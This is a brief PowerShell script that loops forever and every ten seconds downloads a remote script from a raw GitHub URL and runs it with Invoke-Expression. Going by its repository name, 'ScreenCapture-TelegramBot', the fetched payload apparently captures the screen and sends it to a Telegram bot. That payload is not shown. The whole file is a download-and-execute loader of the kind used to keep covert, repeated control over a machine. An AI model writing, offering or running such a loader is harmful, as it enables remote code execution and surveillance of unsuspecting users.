# Ensure TLS 1.2 is used for secure connections
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Define the raw GitHub URL for the script
$scriptUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/main/src/combined2.ps1"

# Infinite loop to run the script every 10 seconds
while ($true) {
    try {
        # Fetch and execute the script
        Write-Host "Running script at $(Get-Date)"
        Invoke-Expression ((Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content)
    }
    catch {
        # Handle errors (e.g., network issues, script errors)
        Write-Host "Error occurred: $_" -ForegroundColor Red
    }

    # Wait for 10 seconds before the next execution
    Start-Sleep -Seconds 10
}
